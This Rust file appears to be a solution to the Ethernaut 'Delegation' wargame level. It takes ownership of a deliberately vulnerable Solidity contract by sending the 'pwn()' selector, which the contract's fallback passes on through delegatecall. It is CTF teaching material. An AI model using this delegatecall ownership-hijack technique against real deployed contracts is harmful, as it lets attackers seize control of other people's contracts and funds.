//! Ethernaut 06 — Delegation.
//!
//! Goal: Take ownership of the `Delegation` instance, which uses a companion
//! `Delegate` contract. The checked owner belongs to `Delegation`, not
//! `Delegate`.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Delegation.sol

use alloy::network::TransactionBuilder;
use alloy::primitives::keccak256;
use alloy::providers::Provider;
use alloy::rpc::types::TransactionRequest;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl06_delegate::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let selector =
            keccak256("pwn()").into_iter().take(4).collect::<Vec<u8>>();

        let tx = TransactionRequest::default()
            .gas_limit(30_000_000)
            .with_input(selector)
            .from(offender.address())
            .to(target.delegation_address);

        let tx =
            offender.provider().send_transaction(tx).await?.watch().await?;

        println!("{tx:?}");

        Ok(())
    }
}
